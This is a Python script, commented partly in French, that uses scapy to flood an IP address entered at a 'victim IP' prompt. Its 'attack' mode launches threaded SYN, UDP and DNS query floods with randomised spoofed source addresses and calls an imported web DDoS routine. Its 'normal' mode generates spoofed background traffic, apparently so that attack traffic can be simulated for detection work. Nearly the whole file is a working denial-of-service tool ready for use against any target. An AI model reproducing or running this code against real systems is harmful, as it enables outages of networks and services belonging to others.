import time
import random
import threading
from multiprocessing import Process
from scapy.all import IP, TCP, UDP, ICMP, DNS, send, DNSQR, Raw
from queue import Queue
from web_ddos import launch_web_ddos

attack_threads = []

def generate_traffic(destination_ip, destination_port, packet_count):
    while True:
        protocols = ["TCP", "UDP", "ICMP"]
        print("Generation de traffic normal...")
        for _ in range(packet_count):
            src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
            src_port = random.randint(1024, 65535)
            protocol = random.choice(protocols)

            if protocol == "TCP":
                packet = IP(src=src_ip, dst=destination_ip) / TCP(sport=src_port, dport=destination_port)
            elif protocol == "UDP":
                packet = IP(src=src_ip, dst=destination_ip) / UDP(sport=src_port, dport=destination_port)
            elif protocol == "ICMP":
                packet = IP(src=src_ip, dst=destination_ip) / ICMP()

            send(packet, verbose=0)
            time.sleep(0.001)
        time.sleep(3)

def generate_ddos_traffic(destination_ip, destination_port, packet_count, attack_duration):
    global attack_threads
    attack_end_time = time.time() + attack_duration

    def dns_attack():
        while time.time() < attack_end_time:
            for _ in range(packet_count):
                src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
                query_name = destination_ip  # Remplacez par le nom de domaine cible

                packet = IP(src=src_ip, dst=destination_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_name))
                send(packet, verbose=0)

    def syn_flood_attack():
        while time.time() < attack_end_time:
            for _ in range(packet_count):
                src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
                src_port = random.randint(1024, 65535)

                packet = IP(src=src_ip, dst=destination_ip) / TCP(sport=src_port, dport=destination_port, flags="S")
                send(packet, verbose=0)

    def udp_lag_attack():
        while time.time() < attack_end_time:
            for _ in range(packet_count):
                src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
                src_port = random.randint(1024, 65535)

                packet = IP(src=src_ip, dst=destination_ip) / UDP(sport=src_port, dport=destination_port)
                send(packet, verbose=0)

    # Ajoutez les fonctions d'attaque spécifiques à la liste des threads
    attack_threads.append(threading.Thread(target=dns_attack))
    attack_threads.append(threading.Thread(target=syn_flood_attack))
    attack_threads.append(threading.Thread(target=udp_lag_attack))

    # Lancez tous les threads
    for thread in attack_threads:
        thread.start()
    
    launch_web_ddos(f"http://{destination_ip}")

if __name__ == "__main__":
    destination_ip = input("Enter victim IP: ")
    destination_port = 80  # Remplacez par le port de votre destination
    ddos_traffic_count = 10000
    attack_duration = 60  # Durée totale de l'attaque en secondes
    normal_traffic_count = 30
    traffic_type = input("Enter 'normal' to launch normal traffic or 'attack' to launch attack traffic: ")
    normal_process, ddos_process = None, None
    if traffic_type.lower() == 'normal':
        print("\nSimulating normal traffic...")
        normal_process = Process(target=generate_traffic, args=(destination_ip, destination_port, normal_traffic_count,))
        normal_process.start()
    elif traffic_type.lower() == 'attack':
        print("\nSimulating attack traffic...")
        ddos_process = Process(target=generate_ddos_traffic, args=(destination_ip, destination_port, ddos_traffic_count, attack_duration,))
        ddos_process.start()
    else:
        print("Invalid input. Please enter 'normal' or 'attack'.")
        exit(1)

    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("Terminating processes...")
        if normal_process is not None:
            normal_process.terminate()
        if ddos_process is not None:
            ddos_process.terminate()
    print("End.")